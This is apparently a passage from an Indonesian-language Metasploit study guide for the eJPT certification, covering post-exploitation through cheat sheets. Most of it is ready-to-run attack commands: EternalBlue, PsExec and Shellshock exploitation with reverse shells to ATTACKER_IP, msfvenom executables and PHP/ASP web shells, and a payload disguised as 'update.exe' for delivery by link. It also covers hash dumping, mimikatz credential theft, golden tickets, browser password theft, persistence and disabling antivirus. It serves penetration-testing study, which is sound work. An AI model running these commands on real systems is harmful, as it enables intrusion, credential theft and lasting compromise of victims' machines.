portfwd add -l 8080 -p 80 -r 192.168.2.100
# localhost:8080 → 192.168.2.100:80

# Forward lokal ke target (lebih spesifik)
portfwd add -l 3389 -p 3389 -r INTERNAL_WIN_HOST
portfwd add -l 1433 -p 1433 -r INTERNAL_SQL_HOST

# List port forwards
portfwd list

# Hapus port forward
portfwd delete -l 8080 -p 80 -r 192.168.2.100

# Flush semua
portfwd flush

# ─── NETWORK SNIFFING ───────────────────────────────────────

load sniffer
sniffer_interfaces              # list interface
sniffer_start 1                 # mulai sniff di interface 1
sniffer_stats 1                 # statistik capture
sniffer_dump 1 /tmp/cap.pcap    # dump ke file
sniffer_stop 1                  # stop
```

---

### 7.4 Privilege Escalation

```bash
# ─── GETSYSTEM ──────────────────────────────────────────────

# Otomatis coba semua teknik
getsystem

# Manual pilih teknik:
# Teknik 1: Named Pipe Impersonation (In Memory/Admin)
getsystem -t 1

# Teknik 2: Named Pipe Impersonation (Dropper/Admin)
getsystem -t 2

# Teknik 3: Token Duplication (In Memory/Admin)
getsystem -t 3

# Teknik 4: Named Pipe Impersonation (RPCSS variant)
getsystem -t 4

# Verifikasi
getuid
# Output: NT AUTHORITY\SYSTEM

# ─── TOKEN IMPERSONATION ────────────────────────────────────

load incognito                  # load modul incognito
list_tokens -u                  # list available user tokens
list_tokens -g                  # list available group tokens
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"
steal_token 1234                # steal token dari PID tertentu
drop_token                      # revert ke original token

# ─── LOCAL EXPLOIT SUGGESTER ────────────────────────────────

run post/multi/recon/local_exploit_suggester
# Akan suggest exploit berdasarkan OS dan patch level
```

---

### 7.5 Credential Harvesting

```bash
# ─── HASH DUMPING ───────────────────────────────────────────

# Method 1: hashdump command (butuh SYSTEM)
hashdump

# Method 2: Post module
run post/windows/gather/hashdump

# Method 3: Smart hashdump (bisa pada domain controller)
run post/windows/gather/smart_hashdump

# ─── MIMIKATZ / KIWI ────────────────────────────────────────

# Load kiwi (mimikatz di meterpreter)
load kiwi

# Dump semua credentials
creds_all

# Dump password dari memory (plaintext jika ada)
creds_wdigest

# Dump Kerberos tickets
creds_kerberos

# Dump NTLM hashes dari SAM
lsa_dump_sam

# Dump LSA secrets
lsa_dump_secrets

# Golden ticket attack (advanced)
golden_ticket_create -d domain.local -k KRBTGT_HASH -s DOMAIN_SID -u administrator -t /tmp/golden.tkt
kerberos_ticket_use /tmp/golden.tkt

# ─── SAM DATABASE ───────────────────────────────────────────

# Download SAM dan SYSTEM hive untuk offline cracking
download C:\\Windows\\System32\\config\\SAM /tmp/
download C:\\Windows\\System32\\config\\SYSTEM /tmp/
download C:\\Windows\\System32\\config\\SECURITY /tmp/

# Offline: extract dengan impacket
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# ─── BROWSER CREDENTIALS ────────────────────────────────────

run post/windows/gather/credentials/chrome
run post/windows/gather/credentials/firefox
run post/multi/gather/firefox_creds

# ─── MISC CREDENTIALS ───────────────────────────────────────

run post/windows/gather/credentials/credential_collector
run post/multi/gather/env                # environment variables (mungkin ada password)
```

---

### 7.6 Pivoting via Meterpreter

```bash
# ─── SETUP AUTOROUTE ────────────────────────────────────────

# Method 1: Post module
run post/multi/manage/autoroute

# Method 2: Autoroute script
run autoroute -s 192.168.2.0/24    # tambah route ke subnet
run autoroute -p                   # print routing table MSF

# Method 3: Route command dari msfconsole
background                         # background sesi dulu
route add 192.168.2.0 255.255.255.0 1  # add route via sesi 1
route print                        # verifikasi

# ─── SOCKS PROXY ────────────────────────────────────────────

# Setup SOCKS proxy untuk proxychains
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Edit proxychains config
# /etc/proxychains4.conf
# Tambahkan: socks5 127.0.0.1 1080

# Scan internal network via proxy
proxychains nmap -sT -Pn -p 22,80,445,3389 192.168.2.0/24

# ─── PORT FORWARDING UNTUK PIVOT ───────────────────────────

# Akses service internal melalui pivot
portfwd add -l 445 -p 445 -r 192.168.2.100

# Sekarang bisa akses SMB internal:
smbclient -L //localhost/ -U admin

# Akses web internal:
portfwd add -l 8080 -p 80 -r 192.168.2.200
curl http://localhost:8080
```

---

## 8. Scanning & Enumeration dengan MSF

### Workflow Scanning Lengkap

```bash
# ─── 1. SETUP WORKSPACE ─────────────────────────────────────

workspace -a new_engagement
workspace new_engagement

# ─── 2. HOST DISCOVERY ──────────────────────────────────────

use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# Atau gunakan db_nmap
db_nmap -sn 192.168.1.0/24

# Lihat host yang ditemukan
hosts

# ─── 3. PORT SCANNING ───────────────────────────────────────

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000,3389,5985,8080,8443
set THREADS 50
run

# Atau db_nmap
db_nmap -sV -sC --top-ports 1000 -T4 192.168.1.0/24

# Lihat services
services

# ─── 4. SERVICE-SPECIFIC ENUM ───────────────────────────────

# SMB
services -p 445 -R   # set RHOSTS dari hosts yang punya port 445

use auxiliary/scanner/smb/smb_version
run

use auxiliary/scanner/smb/smb_ms17_010
run

use auxiliary/scanner/smb/smb_enumshares
run

# SSH
services -p 22 -R

use auxiliary/scanner/ssh/ssh_version
run

# HTTP
services -p 80 -R

use auxiliary/scanner/http/http_version
run

use auxiliary/scanner/http/dir_scanner
run

# ─── 5. VULNERABILITY SCAN ──────────────────────────────────

db_nmap --script vuln -p $(services -p -c port | tail -n +2 | awk '{print $1}' | tr '\n' ',') TARGET_IP

# Lihat temuan
vulns

# ─── 6. EXPLOIT BERDASARKAN TEMUAN ──────────────────────────

# Jika MS17-010 ditemukan
use exploit/windows/smb/ms17_010_eternalblue
hosts -R    # set RHOSTS dari database
run
```

---

## 9. Exploitation Workflows

### 9.1 Windows Exploitation

#### Skenario: Windows 7 / Server 2008 dengan EternalBlue

```bash
# 1. Verifikasi target rentan
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# 2. Eksploitasi
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# 3. Post-exploitation
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getsystem      # jika belum SYSTEM
meterpreter> hashdump
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> run post/multi/recon/local_exploit_suggester
```

#### Skenario: Windows dengan Credentials Diketahui (PsExec)

```bash
# 1. Verifikasi credentials
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass Password123
run

# 2. Eksploitasi dengan PsExec
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass Password123
set LHOST ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# 3. Atau dengan PsExec menggunakan hash
set SMBPass LMHASH:NTLMHASH
run
```

#### Skenario: Msfvenom Payload + Social Engineering

```bash
# 1. Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o update.exe

# 2. Setup handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j

# 3. Delivery (hosting file)
cd /tmp && python3 -m http.server 80
# Kirim link: http://ATTACKER_IP/update.exe ke target

# 4. Setelah target eksekusi
sessions
sessions -i 1
```

---

### 9.2 Linux Exploitation

#### Skenario: vsFTPd 2.3.4

```bash
# 1. Cek versi
use auxiliary/scanner/ftp/ftp_version
set RHOSTS TARGET_IP
run

# Jika versi 2.3.4:
# 2. Eksploitasi
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run

# 3. Upgrade shell ke meterpreter
# (shell biasa akan didapat, bukan meterpreter)
Ctrl+Z  # background shell
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

#### Skenario: Shellshock

```bash
# 1. Cek kerentanan
nmap -p 80 --script http-shellshock TARGET_IP

# 2. Eksploitasi
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET_IP
set TARGETURI /cgi-bin/test.cgi      # sesuaikan dengan path CGI
set LHOST ATTACKER_IP
set PAYLOAD linux/x86/meterpreter/reverse_tcp
run

# 3. Post-exploitation Linux
meterpreter> sysinfo
meterpreter> getuid
meterpreter> run post/multi/recon/local_exploit_suggester
meterpreter> run post/linux/gather/hashdump
meterpreter> run post/linux/gather/enum_configs
```

---

## 10. Post-Exploitation Modules

### Komprehensif Post-Exploitation

```bash
# Asumsi: sesi Meterpreter aktif dengan SESSION=1

# ─── SYSTEM INFO ────────────────────────────────────────────

run post/windows/gather/enum_system SESSION=1
run post/windows/gather/enum_patches SESSION=1
run post/windows/gather/enum_domain SESSION=1

# ─── USER & CREDENTIAL ──────────────────────────────────────

run post/windows/gather/hashdump SESSION=1
run post/windows/gather/enum_logged_on_users SESSION=1
run post/windows/gather/credentials/credential_collector SESSION=1
run post/windows/gather/credentials/chrome SESSION=1
run post/windows/gather/credentials/firefox SESSION=1

# ─── NETWORK ────────────────────────────────────────────────

run post/windows/gather/enum_shares SESSION=1
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24 SESSION=1
run post/multi/manage/autoroute SESSION=1

# ─── FILE SYSTEM ────────────────────────────────────────────

run post/windows/gather/enum_applications SESSION=1

# ─── PRIVILEGE ESCALATION ───────────────────────────────────

run post/multi/recon/local_exploit_suggester SESSION=1

# ─── PERSISTENCE ────────────────────────────────────────────

run post/windows/manage/persistence_exe SESSION=1 STARTUP=REGISTRY
run post/windows/manage/enable_rdp SESSION=1   # enable RDP

# ─── LINUX POST ─────────────────────────────────────────────

run post/linux/gather/hashdump SESSION=1
run post/linux/gather/enum_configs SESSION=1
run post/linux/gather/enum_network SESSION=1
run post/linux/gather/enum_system SESSION=1
run post/linux/gather/enum_users_history SESSION=1
```

---

## 11. MSF Automation & Scripting

### Resource Scripts (.rc files)

Resource scripts memungkinkan otomasi perintah MSF.

```bash
# ─── MEMBUAT RESOURCE SCRIPT ────────────────────────────────

# File: quick_scan.rc
cat > /tmp/quick_scan.rc << 'EOF'
workspace -a autoscan
db_nmap -sV -sC --top-ports 1000 192.168.1.0/24
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
use auxiliary/scanner/smb/smb_version
run
hosts
services
vulns
EOF

# Jalankan resource script
msfconsole -r /tmp/quick_scan.rc

# Atau dari dalam msfconsole
resource /tmp/quick_scan.rc

# ─── RESOURCE SCRIPT EXPLOITATION ──────────────────────────

cat > /tmp/exploit_eternal.rc << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit -j
EOF

msfconsole -r /tmp/exploit_eternal.rc

# ─── RESOURCE SCRIPT DENGAN VARIABEL ────────────────────────

cat > /tmp/setup.rc << 'EOF'
setg LHOST 192.168.1.10
setg LPORT 4444
setg PAYLOAD windows/x64/meterpreter/reverse_tcp
workspace -a $(date +%Y%m%d)
use exploit/multi/handler
set ExitOnSession false
run -j
EOF
```

### Makerc & Session Automation

```bash
# Simpan riwayat perintah ke resource file
makerc /tmp/session_history.rc

# Jalankan perintah di semua sesi aktif
sessions -C 'sysinfo'
sessions -C 'getuid'
sessions -C 'run post/windows/gather/hashdump'

# ─── METERPRETER SCRIPTING ──────────────────────────────────

# Script built-in
meterpreter> run checkvm              # cek apakah di VM
meterpreter> run getcountermeasure    # cek security products
meterpreter> run getgui               # enable RDP
meterpreter> run killav               # coba matikan AV
meterpreter> run persistence          # basic persistence
meterpreter> run post/windows/gather/hashdump

# ─── DARI COMMAND LINE ──────────────────────────────────────

# Jalankan satu perintah langsung
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j"

# Quiet mode (kurangi output banner)
msfconsole -q

# Quiet + resource script
msfconsole -q -r /tmp/setup.rc
```

---

## 12. Cheat Sheet & Quick Reference

### MSFconsole Quick Commands

```bash
# SEARCH
search ms17-010
search type:exploit platform:windows smb
search cve:2019-0708

# USE & CONFIG
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# SESSIONS
sessions -l              # list
sessions -i 1            # interact
sessions -k 1            # kill
sessions -C 'whoami'     # run cmd di semua sesi

# DATABASE
db_nmap -sV -sC TARGET
hosts
services
vulns
creds
```

### Meterpreter Quick Commands

```bash
# SYSTEM
sysinfo | getuid | getsystem | ps | migrate PID

# FILES
ls | cd | cat | upload | download | search -f *.txt

# NETWORK
ifconfig | route | arp | portfwd add -l 8080 -p 80 -r INTERNAL

# CREDENTIALS
hashdump
load kiwi; creds_all; lsa_dump_sam

# PERSISTENCE
run post/windows/manage/persistence_exe STARTUP=REGISTRY

# PIVOT
run post/multi/manage/autoroute SUBNET=192.168.2.0/24
```

### Msfvenom Quick Reference

```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o w.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o l.elf

# PHP Web Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# ASP Web Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp

# Handler (listener)
use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j
```

### Module Quick Reference

| Tujuan | Module Path |
|---|---|
| SMB Vuln Check | `auxiliary/scanner/smb/smb_ms17_010` |
| SMB Login Brute | `auxiliary/scanner/smb/smb_login` |
| SSH Login Brute | `auxiliary/scanner/ssh/ssh_login` |
| FTP Login Brute | `auxiliary/scanner/ftp/ftp_login` |
| HTTP Dir Scan | `auxiliary/scanner/http/dir_scanner` |
| SNMP Enum | `auxiliary/scanner/snmp/snmp_enum` |
| EternalBlue | `exploit/windows/smb/ms17_010_eternalblue` |
| PsExec | `exploit/windows/smb/psexec` |
| WebDAV Upload | `exploit/windows/iis/iis_webdav_upload_asp` |
| Shellshock | `exploit/multi/http/apache_mod_cgi_bash_env_exec` |
| vsFTPd Backdoor | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Samba usermap | `exploit/multi/samba/usermap_script` |
| Hash Dump | `post/windows/gather/hashdump` |
| Local PrivEsc | `post/multi/recon/local_exploit_suggester` |
| Autoroute | `post/multi/manage/autoroute` |
| SOCKS Proxy | `auxiliary/server/socks_proxy` |
| Shell → Meter | `post/multi/manage/shell_to_meterpreter` |

### Troubleshooting Umum

```bash
# Session mati setelah exploit
# → Migrate ke proses yang lebih stabil
migrate -N explorer.exe

# getsystem gagal
# → Coba teknik berbeda atau gunakan local exploit suggester
run post/multi/recon/local_exploit_suggester

# Payload tidak connect
# → Cek firewall, pastikan LHOST benar
# → Cek apakah listener sudah jalan: jobs
# → Coba port berbeda (80, 443 sering diizinkan firewall)
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_https

# Database tidak connect
msfdb status
msfdb start
db_status    # dari msfconsole

# Module tidak ditemukan / outdated
# Dari terminal:
apt update && apt upgrade metasploit-framework
# Dari msfconsole:
reload_all   # reload semua module dari disk
```

---

## 📚 Referensi & Sumber Belajar

| Sumber | URL |
|---|---|
| eJPT Certification | https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester |
| Metasploit Docs | https://docs.metasploit.com/ |
| Metasploit Unleashed | https://www.offensive-security.com/metasploit-unleashed/ |
| Rapid7 Blog | https://www.rapid7.com/blog/ |
| HackTricks MSF | https://book.hacktricks.xyz/generic-methodologies-and-resources/metasploit-for-pentesting |
| Meterpreter Docs | https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| GTFOBins | https://gtfobins.github.io/ |

---

*📅 Dibuat untuk studi eJPT — The Metasploit Framework (MSF)*
*⚠️ Gunakan hanya di lingkungan yang telah mendapat izin*
